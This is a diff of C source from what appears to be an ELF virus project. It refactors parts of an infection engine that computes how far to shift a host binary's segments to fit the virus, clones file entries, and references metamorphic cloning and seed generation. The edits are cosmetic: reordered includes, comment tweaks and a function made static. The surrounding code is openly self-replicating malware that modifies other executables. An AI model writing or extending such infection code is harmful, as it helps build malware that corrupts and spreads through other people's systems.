@@ -1,19 +1,19 @@
 #include "virus.h"
 #include "utils.h"
-#include "errors.h"
 #include "compiler_utils.h"
+#include "errors.h"
 
 static bool	define_shift_amount(const struct entry *file_entry,
 			size_t *shift_amount, size_t full_virus_size)
 {
 	const size_t	p_align = file_entry->safe_phdr->p_align;
 
-	// shift_amount aligned to Elf64 Segments alignement requirements
+	// shift_amount aligned to Elf64 segments alignement requirements
 	*shift_amount = ALIGN(full_virus_size, p_align);
 	return true;
 }
 
-bool		define_clone_entry(struct entry *clone_entry, struct entry file_entry,
+static bool	define_clone_entry(struct entry *clone_entry, struct entry file_entry,
 			size_t shift_amount)
 {
 	*clone_entry = file_entry;
@@ -26,8 +26,8 @@ bool		infection_engine(struct virus_header *vhdr,
 			struct safe_ptr file_ref, struct safe_ptr clone_ref,
 			size_t *shift_amount)
 {
-	struct entry	file_entry;
-	struct entry	clone_entry;
+	struct entry	file_entry;                                             // init by <find_entry>
+	struct entry	clone_entry;                                            // init by <define_clone_entry>
 	const size_t	*loader_offset   = &file_entry.payload_offset;          // init by <find_entry>
 	uint64_t	*seed            = &vhdr->seed;                         // changed by <generate_seed>
 	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_clone>
